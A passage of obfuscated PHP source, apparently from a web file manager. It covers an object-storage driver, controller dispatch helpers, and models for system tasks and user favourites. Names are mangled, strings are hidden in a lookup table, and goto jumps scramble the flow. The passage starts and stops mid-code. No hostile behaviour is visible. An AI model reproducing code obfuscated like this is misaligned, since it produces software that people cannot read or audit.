$this->copyFile($e»ëΩÊ≈î¿, $e»ëΩÊ≈î¿, array($F‹”⁄€‹Çâ[192] => $bÜº ®ƒ‹à[$F‹”⁄€‹Çâ[193]])); return $bÜº ®ƒ‹à ? !0 : !1; goto dÆ˘‰¯†Âï; DÑ‹·é£ﬁç: $bÜº ®ƒ‹à = $this->client->putObject($dä‹‹Êæú·, $this->bucket, $e»ëΩÊ≈î¿, $F‹”⁄€‹Çâ[181], array(), $fáÜÂç¯íú); if (!$bÜº ®ƒ‹à) { return !1; } if ($cÀÁ˘∑©À÷) { return !0; } goto AÚÌòÜ’Çá; fÕó¬˜ÌáÈ: $F‹”⁄€‹Çâ =& $_SERVER[∞„˜ƒÑºª]; $e»ëΩÊ≈î¿ = $cÀÁ˘∑©À÷ ? trim($e»ëΩÊ≈î¿, $F‹”⁄€‹Çâ[8]) . $F‹”⁄€‹Çâ[8] : $e»ëΩÊ≈î¿; $fáÜÂç¯íú = get_file_mime(get_path_ext($e»ëΩÊ≈î¿)); goto DÑ‹·é£ﬁç; dÆ˘‰¯†Âï: } public function fileSubstr($FÁÇû¥ó∏ú, $Dºò≈•áà›, $F¬ë‰Ω—°—) { $Bé∏íÑ†ãÇ = $Dºò≈•áà› + $F¬ë‰Ω—°— - 1; return $this->client->getObject($this->bucket, $FÁÇû¥ó∏ú, array($_SERVER[∞„˜ƒÑºª][194] => "\142\171\x74\x65\163\75{$Dºò≈•áà›}\55{$Bé∏íÑ†ãÇ}")); } public function upload($e‰œ±¢Õ•Ú, $cÊƒöÈŒìÕ, $Fﬂ©Ì„öπÕ = false, $cÂÉñ˜ÛëΩ = REPEAT_REPLACE) { $CäæÕıÊ¿µ =& $_SERVER[∞„˜ƒÑºª]; $dÁ‹∑Ï∞ﬁÇ = array($CäæÕıÊ¿µ[192] => @md5_file($cÊƒöÈŒìÕ)); $DÜ≤Ê∫… Ñ = array($CäæÕıÊ¿µ[195] => get_file_mime(get_path_ext($e‰œ±¢Õ•Ú))); if (IO::size($cÊƒöÈŒìÕ) <= 1024 * 1024 * 200) { $bÑ›ı•ÿì¿ = $this->client->putObjectFile($cÊƒöÈŒìÕ, $this->bucket, $e‰œ±¢Õ•Ú, $CäæÕıÊ¿µ[181], $dÁ‹∑Ï∞ﬁÇ, $DÜ≤Ê∫… Ñ); return !empty($bÑ›ı•ÿì¿) ? !0 : !1; } $FÉπ¿‡Ë∆¥ = $this->client->multiUploadObject($cÊƒöÈŒìÕ, $this->bucket, trim($e‰œ±¢Õ•Ú, $CäæÕıÊ¿µ[8]), $dÁ‹∑Ï∞ﬁÇ, $DÜ≤Ê∫… Ñ); return $FÉπ¿‡Ë∆¥ ? $this->getPathOuter($e‰œ±¢Õ•Ú) : !1; } public function download($A‹‰¬çóì∞, $a€Û ë≥â‰) { if (!@is_dir($this->pathFather($a€Û ë≥â‰)) && !IO::mkdir($this->pathFather($a€Û ë≥â‰))) { return !1; } $a‡“≠ÇÊö∫ = $this->client->getObject($this->bucket, $A‹‰¬çóì∞, array(), $a€Û ë≥â‰); return $a‡“≠ÇÊö∫ !== !1 ? $a€Û ë≥â‰ : !1; } public function link($E÷ìŸªúë•, $f¯ä¯‘èá = array()) { $b•ÙÙ¡√æŒ =& $_SERVER[∞„˜ƒÑºª]; if ($this->signVer == $b•ÙÙ¡√æŒ[196]) { return $this->client->getAuthenticatedURL($this->bucket, $E÷ìŸªúë•, 3600 * 12, !1, $f¯ä¯‘èá); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($E÷ìŸªúë•, $b•ÙÙ¡√æŒ[8]), 3600 * 12, $this->region, array(), !0, $f¯ä¯‘èá); } public function fileOut($BÔéÜÆ¨∆Æ, $dëªùô’ÏΩ = false, $E„¢åﬁùπ¡ = false, $FŒ∆äÇù√ù = '') { goto dí∞∞©±¬†; dŸ∆ﬂµ‹∫ë: $d›è‡·∞ûƒ = $this->link($BÔéÜÆ¨∆Æ, $a¯≥∞Ù‰Û´); $this->fileOutLink($d›è‡·∞ûƒ); goto a¡ÆÜ¡ßôÙ; Bó’àáöÕã: if ($a”±Ñº∏ô‚ == $C√—œäÕ∞[197]) { return parent::fileOut($BÔéÜÆ¨∆Æ, $dëªùô’ÏΩ, $E„¢åﬁùπ¡, $FŒ∆äÇù√ù); } $dëªùô’ÏΩ = $dëªùô’ÏΩ ? $C√—œäÕ∞[198] : $C√—œäÕ∞[199]; $a¯≥∞Ù‰Û´ = array($C√—œäÕ∞[200] => $dëªùô’ÏΩ . $C√—œäÕ∞[201] . rawurlencode($E„¢åﬁùπ¡), $C√—œäÕ∞[202] => $a”±Ñº∏ô‚); goto dŸ∆ﬂµ‹∫ë; dí∞∞©±¬†: $C√—œäÕ∞ =& $_SERVER[∞„˜ƒÑºª]; if (!$E„¢åﬁùπ¡) { $E„¢åﬁùπ¡ = $this->pathThis($BÔéÜÆ¨∆Æ); } $a”±Ñº∏ô‚ = get_file_mime(get_path_ext($E„¢åﬁùπ¡)); goto Bó’àáöÕã; a¡ÆÜ¡ßôÙ: } public function fileOutServer($fÜ¬≥≠ƒ‘¯, $Dã„Âá≠»ï = false, $e≥‹—â¬§≈ = false, $bË«Ì„“á¢ = '') { parent::fileOut($fÜ¬≥≠ƒ‘¯, $Dã„Âá≠»ï, $e≥‹—â¬§≈, $bË«Ì„“á¢); } public function fileOutImage($Eﬁª≤…ŸÙƒ, $bëÔÖµËÓë = 250) { $C˜€Éµ“åå = $this->link($Eﬁª≤…ŸÙƒ); $this->fileOutLink($C˜€Éµ“åå); } public function fileOutImageServer($DŒˆ„®ö±—, $dÊ‰Ω…á÷ª = 250) { parent::fileOutImage($DŒˆ„®ö±—, $dÊ‰Ω…á÷ª); } public function hashMd5($BﬂÒÊ’ΩÜê, $Dñâ¬Êàõƒ = '') { $d›Òô≤®ñ© =& $_SERVER[∞„˜ƒÑºª]; $AÙú’îáçî = $this->getObjectInfo($BﬂÒÊ’ΩÜê); if (!$AÙú’îáçî) { return !1; } if (!isset($AÙú’îáçî[$d›Òô≤®ñ©[203]]) && !empty($Dñâ¬Êàõƒ)) { $EÎòª™ŒÙ’ = $this->copyFile($BﬂÒÊ’ΩÜê, $BﬂÒÊ’ΩÜê, array($d›Òô≤®ñ©[192] => $Dñâ¬Êàõƒ)); $AÙú’îáçî[$d›Òô≤®ñ©[203]] = $EÎòª™ŒÙ’ ? $Dñâ¬Êàõƒ : $d›Òô≤®ñ©[33]; } return isset($AÙú’îáçî[$d›Òô≤®ñ©[203]]) ? $AÙú’îáçî[$d›Òô≤®ñ©[203]] : $d›Òô≤®ñ©[33]; } public function fileInfoImage($B¥Á˜¥ñâø, &$eáæÈôçâé) { $Aâ˘…áçÙ˜ =& $_SERVER[∞„˜ƒÑºª]; $dèåä¨Ö¥ä = array($Aâ˘…áçÙ˜[204], $Aâ˘…áçÙ˜[157], $Aâ˘…áçÙ˜[205], $Aâ˘…áçÙ˜[206], $Aâ˘…áçÙ˜[207]); if (in_array($eáæÈôçâé[$Aâ˘…áçÙ˜[156]], $dèåä¨Ö¥ä)) { $a¥ãı¡èá» = $this->link($B¥Á˜¥ñâø); $cﬁ éÆå∆∑ = getimagesize($a¥ãı¡èá»); if ($cﬁ éÆå∆∑) { $eáæÈôçâé[$Aâ˘…áçÙ˜[208]] = array($Aâ˘…áçÙ˜[209] => $cﬁ éÆå∆∑[0], $Aâ˘…áçÙ˜[210] => $cﬁ éÆå∆∑[1]); } } } public function getObjectInfo($cÇ…∂©°ÑÙ) { return $this->client->getObjectInfo($this->bucket, $cÇ…∂©°ÑÙ); } public function uploadFormData($D“Çèó¥ÊŸ, $DÇÒ•Í∂∞¿ = 3600) { $A≈öﬁøßìñ =& $_SERVER[∞„˜ƒÑºª]; $d¥∏ÌŒäêô = $this->pathFather($D“Çèó¥ÊŸ); $dÇÒﬁÍä…Ø = $this->client->getHttpUploadPostParams($this->bucket, $d¥∏ÌŒäêô, $A≈öﬁøßìñ[181], $DÇÒ•Í∂∞¿); return array_merge((array) $dÇÒﬁÍä…Ø, array($A≈öﬁøßìñ[165] => $this->getHost())); } public function multiUploadFormData($d§™óê∞§Õ, $E◊Î»ÌÔ« = 3600) { $aÀΩ¶Ã∑ÓÒ =& $_SERVER[∞„˜ƒÑºª]; $bìÁ„äÜ≥Á = gmdate($aÀΩ¶Ã∑ÓÒ[211]); $e≤∏À»—û¬ = array(); $c≤◊ßäâ◊– = $this->client->getUploadId($this->bucket, $d§™óê∞§Õ, $e≤∏À»—û¬); if (!$c≤◊ßäâ◊–) { return !1; } return array($aÀΩ¶Ã∑ÓÒ[212] => $c≤◊ßäâ◊–, $aÀΩ¶Ã∑ÓÒ[165] => $this->getHost() . $aÀΩ¶Ã∑ÓÒ[8] . $this->pathEncode($d§™óê∞§Õ), $aÀΩ¶Ã∑ÓÒ[213] => $bìÁ„äÜ≥Á, $aÀΩ¶Ã∑ÓÒ[96] => $d§™óê∞§Õ); } public function multiUploadAuthData($B‘≤∂–ñ‘¡, $aÎ⁄òΩÀÒ’ = array()) { goto cùáÎ≤éﬁá; CﬁºñŸ »è: $CÃπÑª·±û = $DËüŒó·í„[221] . $this->accessKey . $DËüŒó·í„[4] . $båò∆ﬁ£î≠; if (strpos($cŸº¬◊’≠Ê, $DËüŒó·í„[216]) === 0) { return array($DËüŒó·í„[222] => $CÃπÑª·±û, $DËüŒó·í„[213] => $Fá¿Ëïº¯·); } return $CÃπÑª·±û; goto b†¬ÉùâÕÕ; c´ﬁêéûŸ›: $cŸº¬◊’≠Ê = isset($aÎ⁄òΩÀÒ’[$DËüŒó·í„[156]]) ? $aÎ⁄òΩÀÒ’[$DËüŒó·í„[156]] : $DËüŒó·í„[33]; $F⁄Ω™≈Î⁄√ = $aÎ⁄òΩÀÒ’[$DËüŒó·í„[96]]; unset($aÎ⁄òΩÀÒ’[$DËüŒó·í„[96]]); goto cª•ø≥áËŒ; cª•ø≥áËŒ: if (isset($aÎ⁄òΩÀÒ’[$DËüŒó·í„[214]])) { return $this->listUploadParts($F⁄Ω™≈Î⁄√, $aÎ⁄òΩÀÒ’); } $dê¥îõï÷π = array($DËüŒó·í„[215], $DËüŒó·í„[33], $DËüŒó·í„[113], $DËüŒó·í„[33], "\170\55\141\x6d\172\55\144\x61\x74\x65\x3a{$Fá¿Ëïº¯·}", $DËüŒó·í„[8] . $this->bucket . $DËüŒó·í„[8] . $this->pathEncode($F⁄Ω™≈Î⁄√) . $cŸº¬◊’≠Ê); if (strpos($cŸº¬◊’≠Ê, $DËüŒó·í„[216]) === 0) { $dê¥îõï÷π[0] = $DËüŒó·í„[217]; } goto e¨ÙÍ≥Ã‰€; e¨ÙÍ≥Ã‰€: if (isset($aÎ⁄òΩÀÒ’[$DËüŒó·í„[218]]) && $aÎ⁄òΩÀÒ’[$DËüŒó·í„[218]] == $DËüŒó·í„[219]) { $dê¥îõï÷π[0] = $DËüŒó·í„[219]; } $A·≥Ã›è√Ö = implode($DËüŒó·í„[55], $dê¥îõï÷π); $båò∆ﬁ£î≠ = base64_encode(hash_hmac($DËüŒó·í„[220], $A·≥Ã›è√Ö, $this->secret, !0)); goto CﬁºñŸ »è; cùáÎ≤éﬁá: $DËüŒó·í„ =& $_SERVER[∞„˜ƒÑºª]; $Fá¿Ëïº¯· = isset($aÎ⁄òΩÀÒ’[$DËüŒó·í„[213]]) ? $aÎ⁄òΩÀÒ’[$DËüŒó·í„[213]] : gmdate($DËüŒó·í„[211]); $aÎ⁄òΩÀÒ’[$DËüŒó·í„[213]] = $Fá¿Ëïº¯·; goto c´ﬁêéûŸ›; b†¬ÉùâÕÕ: } public function listUploadParts($BÉø∞õëΩ«, $F€◊ßá¨Üﬁ = array()) { goto C§πÎ…¿∆…; C‘É∫‚¡∞È: $A≠∞Ü°Ã€◊ = $this->multiUploadAuthData($BÉø∞õëΩ«, $F€◊ßá¨Üﬁ); if (empty($A≠∞Ü°Ã€◊)) { return !1; } return array($cà•⁄ÛÖéÜ[222] => $A≠∞Ü°Ã€◊, $cà•⁄ÛÖéÜ[213] => $F€◊ßá¨Üﬁ[$cà•⁄ÛÖéÜ[213]], $cà•⁄ÛÖéÜ[224] => $Dﬂç‘¢‚åà); goto AË´Çóã¡«; C§πÎ…¿∆…: $cà•⁄ÛÖéÜ =& $_SERVER[∞„˜ƒÑºª]; $C◊Ÿ≤‡ÿ∞® = str_replace($cà•⁄ÛÖéÜ[223], $cà•⁄ÛÖéÜ[33], $F€◊ßá¨Üﬁ[$cà•⁄ÛÖéÜ[156]]); $Dﬂç‘¢‚åà = $this->client->listParts($this->bucket, $BÉø∞õëΩ«, $C◊Ÿ≤‡ÿ∞®); goto D–∏Ñòª»À; D–∏Ñòª»À: if (!$Dﬂç‘¢‚åà) { return !1; } unset($F€◊ßá¨Üﬁ[$cà•⁄ÛÖéÜ[214]], $F€◊ßá¨Üﬁ[$cà•⁄ÛÖéÜ[218]]); $F€◊ßá¨Üﬁ[$cà•⁄ÛÖéÜ[96]] = $BÉø∞õëΩ«; goto C‘É∫‚¡∞È; AË´Çóã¡«: } } goto D°√†´∫Â¥; bâå´‘ëÕ€: function Action($Eß¿∑∏îâ§ = '') { goto aÒç«‚ùµÁ; E¢åπÜŒÔ“: $fªª£´âπˆ = strtolower($c‹œêí„™); if (isset($A°®§ÎÓ∂Ù[$fªª£´âπˆ])) { return $A°®§ÎÓ∂Ù[$fªª£´âπˆ]; } if (is_file($FãËÇ’±æπ)) { include_once $FãËÇ’±æπ; } goto d€Î¡ÉŒ„à; aÒç«‚ùµÁ: $b˘¨€®€î =& $_SERVER[ÔÒÀÃÆ›—ü]; static $A°®§ÎÓ∂Ù = array(); $Eß¿∑∏îâ§ = trim(str_replace($b˘¨€®€î[2], $b˘¨€®€î[3], $Eß¿∑∏îâ§), $b˘¨€®€î[2]); goto DÆ ∂Ω˜Ô‡; d€Î¡ÉŒ„à: if (!class_exists($c‹œêí„™)) { return write_log($b˘¨€®€î[13] . $Eß¿∑∏îâ§ . $b˘¨€®€î[14] . $c‹œêí„™ . $b˘¨€®€î[15], $b˘¨€®€î[16]); } $A°®§ÎÓ∂Ù[$fªª£´âπˆ] = new $c‹œêí„™(); return $A°®§ÎÓ∂Ù[$fªª£´âπˆ]; goto D∏Ôá©ü¥µ; DÆ ∂Ω˜Ô‡: $fÏŒ≤˜é° = explode($b˘¨€®€î[3], $Eß¿∑∏îâ§); $AÇÇÕÊÌìÔ = strtolower($fÏŒ≤˜é°[0]); if (substr($AÇÇÕÊÌìÔ, -6) == $b˘¨€®€î[4]) { $Eß¿∑∏îâ§ = substr($fÏŒ≤˜é°[0], 0, -6); $c‹œêí„™ = $Eß¿∑∏îâ§ . $b˘¨€®€î[5]; $FãËÇ’±æπ = $b˘¨€®€î[6]; if (substr(strtolower($fÏŒ≤˜é°[1]), -5) == $b˘¨€®€î[7]) { $c‹œêí„™ = $Eß¿∑∏îâ§ . $fÏŒ≤˜é°[1]; $FãËÇ’±æπ = $b˘¨€®€î[8] . $fÏŒ≤˜é°[1] . $b˘¨€®€î[9]; } else { if (count($fÏŒ≤˜é°) == 3) { $c‹œêí„™ = $Eß¿∑∏îâ§ . $fÏŒ≤˜é°[1] . $fÏŒ≤˜é°[2]; $FãËÇ’±æπ = $b˘¨€®€î[10] . $fÏŒ≤˜é°[1] . $b˘¨€®€î[11] . $fÏŒ≤˜é°[2] . $b˘¨€®€î[9]; } } $FãËÇ’±æπ = PLUGIN_DIR . $Eß¿∑∏îâ§ . $b˘¨€®€î[2] . $FãËÇ’±æπ; } else { if (substr($AÇÇÕÊÌìÔ, -5) == $b˘¨€®€î[7]) { $Eß¿∑∏îâ§ = substr($fÏŒ≤˜é°[0], 0, -5); return Model($Eß¿∑∏îâ§); } else { $c‹œêí„™ = $fÏŒ≤˜é°[0] . $fÏŒ≤˜é°[1]; $FãËÇ’±æπ = CONTROLLER_DIR . $fÏŒ≤˜é°[0] . $b˘¨€®€î[2] . $fÏŒ≤˜é°[1] . $b˘¨€®€î[12]; } } goto E¢åπÜŒÔ“; D∏Ôá©ü¥µ: } function ActionApply($A÷‰Èâª„…, $cŸÛıŒÛÉÒ = array()) { goto eéå¥ÚÖ„™; E®œ˘´áø™: $Düö˜ ñŸÇ = strrpos($A÷‰Èâª„…, $e√Õ”µ∑Çø[3]); $b∑äºÂµ≠Ω = substr($A÷‰Èâª„…, 0, $Düö˜ ñŸÇ); $eﬂíˆà∑◊ƒ = substr($A÷‰Èâª„…, $Düö˜ ñŸÇ + 1); goto EÑáÑÜåâè; EÑáÑÜåâè: $aﬁïÍë‹Á› = Action($b∑äºÂµ≠Ω); if (!method_exists($aﬁïÍë‹Á›, $eﬂíˆà∑◊ƒ)) { return write_log($A÷‰Èâª„… . $e√Õ”µ∑Çø[17], $e√Õ”µ∑Çø[16]); } $eˆà¶À´√Ë = call_user_func_array(array($aﬁïÍë‹Á›, $eﬂíˆà∑◊ƒ), $cŸÛıŒÛÉÒ); goto E∑“ÉàéÚ; E∑“ÉàéÚ: return $eˆà¶À´√Ë; goto Cà≥ú≈öÈà; eéå¥ÚÖ„™: $e√Õ”µ∑Çø =& $_SERVER[ÔÒÀÃÆ›—ü]; if (is_array($A÷‰Èâª„…)) { return call_user_func_array($A÷‰Èâª„…, $cŸÛıŒÛÉÒ); } if (function_exists($A÷‰Èâª„…)) { return call_user_func_array($A÷‰Èâª„…, $cŸÛıŒÛÉÒ); } goto E®œ˘´áø™; Cà≥ú≈öÈà: } function ActionCall($añê˜±•ÉË) { $fƒé¶∆Ãüí = array_slice(func_get_args(), 1); return ActionApply($añê˜±•ÉË, $fƒé¶∆Ãüí); } goto bÆ¿±¡À¥Œ; F∂óêÿº∏Í: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\164\141\163\x6b\114\151\163\x74"; public $field = array("\156\141\155\x65", "\164\171\x70\145", "\x65\x76\145\x6e\x74", "\x74\151\155\x65", "\144\x65\163\143", "\163\x79\163\x74\145\x6d", "\145\x6e\141\142\x6c\145", "\x6c\141\163\x74\x52\165\x6e", "\x73\157\162\164"); public function listData($fÓ™ôùèõ◊ = false, $aÙˆø∞≈…‚ = "\163\x6f\162\x74", $f§öûí…«â = false) { return parent::listData($fÓ™ôùèõ◊, $aÙˆø∞≈…‚, $f§öûí…«â); } public function add($BêÃ£‡ ∆≠) { $a•ö÷–ÏÖ≠ =& $_SERVER[∞„˜ƒÑºª]; $bÚû»ÏÓƒ˜ = $this->findByName($BêÃ£‡ ∆≠[$a•ö÷–ÏÖ≠[28]]); if ($bÚû»ÏÓƒ˜) { return !1; } $BêÃ£‡ ∆≠[$a•ö÷–ÏÖ≠[1029]] = 0; $BêÃ£‡ ∆≠[$a•ö÷–ÏÖ≠[1537]] = $this->getSort(); return parent::insert($BêÃ£‡ ∆≠); } private function getSort() { $eÒàÍÛÒ∫Ö =& $_SERVER[∞„˜ƒÑºª]; $d˜Ö›∫Ö∞À = parent::listData(); $Eâµáç‡‹ç = array_to_keyvalue($d˜Ö›∫Ö∞À, $eÒàÍÛÒ∫Ö[33], $eÒàÍÛÒ∫Ö[1537]); return empty($Eâµáç‡‹ç) ? 0 : max($Eâµáç‡‹ç) + 1; } public function update($dè«⁄ÑÒ∂Ê, $Cﬂèù”öö¢) { $EÚ•°ÕèÜÈ =& $_SERVER[∞„˜ƒÑºª]; $FÈ†§äÃ¡á = $this->listData($dè«⁄ÑÒ∂Ê); $DŸö¯Ü®ú‹ = $this->findByName($Cﬂèù”öö¢[$EÚ•°ÕèÜÈ[28]]); if (!$FÈ†§äÃ¡á || $DŸö¯Ü®ú‹ && $DŸö¯Ü®ú‹[$EÚ•°ÕèÜÈ[366]] != $FÈ†§äÃ¡á[$EÚ•°ÕèÜÈ[366]]) { return !1; } return parent::update($dè«⁄ÑÒ∂Ê, $Cﬂèù”öö¢); } public function remove($bÛ±Û≈ì‹Ö) { $D…∆ˆÿçìä = $this->listData($bÛ±Û≈ì‹Ö); if (!$D…∆ˆÿçìä || $D…∆ˆÿçìä[$_SERVER[∞„˜ƒÑºª][804]]) { return !1; } return parent::remove($bÛ±Û≈ì‹Ö); } public function enable($DÁÙ…ç∞ôÏ) { $càã»≈—ò± =& $_SERVER[∞„˜ƒÑºª]; $A√¶Æ˘Ç´ò = $this->listData($DÁÙ…ç∞ôÏ); $e÷‰ÙÉãß‚ = !$A√¶Æ˘Ç´ò[$càã»≈—ò±[1036]]; return $this->update($DÁÙ…ç∞ôÏ, array($càã»≈—ò±[1857] => $e÷‰ÙÉãß‚)); } public function run($a£µÜÀÂÒÎ) { return $this->update($a£µÜÀÂÒÎ, array($_SERVER[∞„˜ƒÑºª][1858] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($f÷¢æ©»≠Ö) { $cÜ¶√≤“„ß =& $_SERVER[∞„˜ƒÑºª]; return array($cÜ¶√≤“„ß[1859] => array(USER_ID, $cÜ¶√≤“„ß[1860])); } protected function listData() { $c∑“¥‘ƒ∆ó =& $_SERVER[∞„˜ƒÑºª]; $cﬂä™’¥· = array($c∑“¥‘ƒ∆ó[1054] => USER_ID, $c∑“¥‘ƒ∆ó[1861] => 0); $EÉ˜ä‘’µÛ = $c∑“¥‘ƒ∆ó[1862]; $e∏ÂÛäÿ•Ø = $this->field($EÉ˜ä‘’µÛ)->where($cﬂä™’¥·)->order($c∑“¥‘ƒ∆ó[1863])->select(); return $e∏ÂÛäÿ•Ø ? $e∏ÂÛäÿ•Ø : array(); } protected function listView() { goto cœìπØŒŒ∑; AâèÏîü√†: $b¶‚Õàì‚Ï = array($EÑ»Êÿæéõ[414] => array($EÑ»Êÿæéõ[951], $c≠‘‘†¡êá)); $Dà°à®âÕÓ = Model($EÑ»Êÿæéõ[520])->listSource($b¶‚Õàì‚Ï, $C¿”êƒÇóÜ); $Dà°à®âÕÓ = array_merge($Dà°à®âÕÓ[$EÑ»Êÿæéõ[82]], $Dà°à®âÕÓ[$EÑ»Êÿæéõ[83]]); goto Bø–ÖæÆ ä; Bø–ÖæÆ ä: $Dà°à®âÕÓ = array_to_keyvalue($Dà°à®âÕÓ, $EÑ»Êÿæéõ[374]); foreach ($f›ã≈ı†‡‡ as $c∏‡≥ˆ¬ê  => $EŸ¿”‰´·Ñ) { $F∆µ™∏ÃöÛ = $Dà°à®âÕÓ[$EŸ¿”‰´·Ñ[$EÑ»Êÿæéõ[84]]]; $F∆µ™∏ÃöÛ = $F∆µ™∏ÃöÛ ? $F∆µ™∏ÃöÛ : array(); $f›ã≈ı†‡‡[$c∏‡≥ˆ¬ê ] = array_merge($F∆µ™∏ÃöÛ, $EŸ¿”‰´·Ñ); } return $f›ã≈ı†‡‡; goto B‡‰®úﬁ∑ª; cÆªßÊÙÏ≥: $c≠‘‘†¡êá = array_to_keyvalue($F¿Â˜…¿ƒ©, $EÑ»Êÿæéõ[33], $EÑ»Êÿæéõ[84]); if (!$c≠‘‘†¡êá) { return $f›ã≈ı†‡‡; } $C¿”êƒÇóÜ = 2000; goto AâèÏîü√†; cœìπØŒŒ∑: $EÑ»Êÿæéõ =& $_SERVER[∞„˜ƒÑºª]; $f›ã≈ı†‡‡ = $this->listData(); $F¿Â˜…¿ƒ© = array_filter_by_field($f›ã≈ı†‡‡, $EÑ»Êÿæéõ[29], $EÑ»Êÿæéõ[954]); goto cÆªßÊÙÏ≥; B‡‰®úﬁ∑ª: } protected function addFav($câ°∞£ë•®, $c€öï∞ëã∫ = '', $BäΩúÀÌ†Á = "\x73\x6f\x75\x72\x63\x65") { goto Bó¬÷Ö¥·ö; d´Œ⁄ ê„ø: $f◊Ô˘‡¶â≤ = array($A≥È®£”öµ[1054] => USER_ID, $A≥È®£”öµ[1861] => 0); $eì¥†∆∫≠ô = $this->where($f◊Ô˘‡¶â≤)->max($A≥È®£”öµ[1537]); if (!$eì¥†∆∫≠ô) { $eì¥†∆∫≠ô = 0; } goto c÷û®∂áÈÚ; Bó¬÷Ö¥·ö: $A≥È®£”öµ =& $_SERVER[∞„˜ƒÑºª]; $f◊Ô˘‡¶â≤ = array($A≥È®£”öµ[1054] => USER_ID, $A≥È®£”öµ[1861] => 0, $A≥È®£”öµ[792] => $BäΩúÀÌ†Á, $A≥È®£”öµ[1577] => $câ°∞£ë•®); if ($this->where($f◊Ô˘‡¶â≤)->find()) { return !1; } goto d´Œ⁄ ê„ø; c÷û®∂áÈÚ: if (!$c€öï∞ëã∫ && $BäΩúÀÌ†Á == $A≥È®£”öµ[954]) { $Cºõù∆º¿ï = Model($A≥È®£”öµ[832])->where(array($A≥È®£”öµ[414] => $câ°∞£ë•®))->find(); if (!$Cºõù∆º¿ï) { return !1; } $c€öï∞ëã∫ = $Cºõù∆º¿ï[$A≥È®£”öµ[28]]; } $c€öï∞ëã∫ = $this->getAutoName($c€öï∞ëã∫); $D÷ãÖèúê∂ = array($A≥È®£”öµ[1054] => USER_ID, $A≥È®£”öµ[1861] => 0, $A≥È®£”öµ[387] => $c€öï∞ëã∫, $A≥È®£”öµ[1577] => $câ°∞£ë•®, $A≥È®£”öµ[792] => $BäΩúÀÌ†Á, $A≥È®£”öµ[1520] => $eì¥†∆∫≠ô + 1); goto eîÜÃÇÖÎó; eîÜÃÇÖÎó: return $this->add($D÷ãÖèúê∂); goto e¶ÇÌ„ˆÖ‚; e¶ÇÌ„ˆÖ‚: } protected function remove($C¿Æ—î‡∞ˆ) { $FÔ«‚¢’®˜ =& $_SERVER[∞„˜ƒÑºª]; $C‡Ó——çÂÙ = array($FÔ«‚¢’®˜[1054] => USER_ID, $FÔ«‚¢’®˜[794] => $C¿Æ—î‡∞ˆ); return $this->where($C‡Ó——çÂÙ)->delete(); } protected function removeByName($cÀò⁄ËÒ ÷) { $d∂Ùæ ˜’∆ =& $_SERVER[∞„˜ƒÑºª]; $eæﬁ»Ç”≥∏ = array($d∂Ùæ ˜’∆[1054] => USER_ID, $d∂Ùæ ˜’∆[387] => $cÀò⁄ËÒ ÷, $d∂Ùæ ˜’∆[1861] => 0); return $this->where($eæﬁ»Ç”≥∏)->delete(); } protected function rename($BÛ⁄∂ıú››, $aªü¨Úœ∫∑) { $eäˆÔ∞äüã =& $_SERVER[∞„˜ƒÑºª]; if ($BÛ⁄∂ıú›› == $aªü¨Úœ∫∑) { return !1; } $A•øÜÇ‚‹æ = $this->getAutoName($aªü¨Úœ∫∑); if ($aªü¨Úœ∫∑ != $A•øÜÇ‚‹æ) { return !1; } $aùëÕ¨á®ç = array($eäˆÔ∞äüã[1054] => USER_ID, $eäˆÔ∞äüã[1861] => 0, $eäˆÔ∞äüã[28] => $BÛ⁄∂ıú››); return $this->where($aùëÕ¨á®ç)->save(array($eäˆÔ∞äüã[28] => $aªü¨Úœ∫∑)); } protected function resetSort($F∏ﬁÈºîèÌ) { $fÉ«úêçê± =& $_SERVER[∞„˜ƒÑºª]; $eõ™∂êß∆§ = array($fÉ«úêçê±[1054] => USER_ID); for ($D∞æ‰æûêÒ = 0; $D∞æ‰æûêÒ < count($F∏ﬁÈºîèÌ); $D∞æ‰æûêÒ++) { $eõ™∂êß∆§[$fÉ«úêçê±[794]] = $F∏ﬁÈºîèÌ[$D∞æ‰æûêÒ]; $this->where($eõ™∂êß∆§)->save(array($fÉ«úêçê±[1520] => $D∞æ‰æûêÒ + 1)); } return !0; } protected function moveTop($eì£–öÏº∆) { goto f†ˆ†πÎâ‹; Fπ€Ñ÷‘ ¢: if (!$d‡å©≠·≠‚) { return; } $d∑⁄–Ω·€Æ = $this->field($b£¬’∑áØ–[366])->where($AïããÖ±û€)->order($b£¬’∑áØ–[1863])->select(); $d∑⁄–Ω·€Æ = array_to_keyvalue($d∑⁄–Ω·€Æ, $b£¬’∑áØ–[33], $b£¬’∑áØ–[366]); goto B⁄¿æåôîª; B⁄¿æåôîª: $bÆøÖ®Ñª≤ = $d∑⁄–Ω·€Æ; $d∑⁄–Ω·€Æ = array_remove_value($d∑⁄–Ω·€Æ, $d‡å©≠·≠‚[$b£¬’∑áØ–[366]]); array_unshift($d∑⁄–Ω·€Æ, $d‡å©≠·≠‚[$b£¬’∑áØ–[366]]); goto e∆ªîÛÖªá; f†ˆ†πÎâ‹: $b£¬’∑áØ– =& $_SERVER[∞„˜ƒÑºª]; $AïããÖ±û€ = array($b£¬’∑áØ–[1054] => USER_ID, $b£¬’∑áØ–[1861] => 0); $d‡å©≠·≠‚ = $this->where($AïããÖ±û€)->where(array($b£¬’∑áØ–[28] => $eì£–öÏº∆))->find(); goto Fπ€Ñ÷‘ ¢; e∆ªîÛÖªá: return $this->resetSort($d∑⁄–Ω·€Æ); goto bé∂ºôƒªƒ; bé∂ºôƒªƒ: } protected function moveBottom($b–≤ç≤¡áƒ) { $A∏˘Ú¿ÁÑê =& $_SERVER[∞„˜ƒÑºª]; $C¿Ì‘éÚòÆ = array($A∏˘Ú¿ÁÑê[1054] => USER_ID, $A∏˘Ú¿ÁÑê[1861] => 0); $fœºÂªÿ∫æ = $this->where($C¿Ì‘éÚòÆ)->max($A∏˘Ú¿ÁÑê[1537]); $Eä˜≥…ﬁÇÔ = array($A∏˘Ú¿ÁÑê[1537] => $fœºÂªÿ∫æ + 1); return $this->where($C¿Ì‘éÚòÆ)->where(array($A∏˘Ú¿ÁÑê[28] => $b–≤ç≤¡áƒ))->save($Eä˜≥…ﬁÇÔ); } private function getAutoName($B⁄ÜêîÖ…ı) { goto cÆó∑ Æã›; cÆó∑ Æã›: $BœıßÂÔı© =& $_SERVER[∞„˜ƒÑºª]; $b≠ãÔÈ©à… = array($BœıßÂÔı©[1054] => USER_ID, $BœıßÂÔı©[1861] => 0); $dÑôÀÊ∞à = 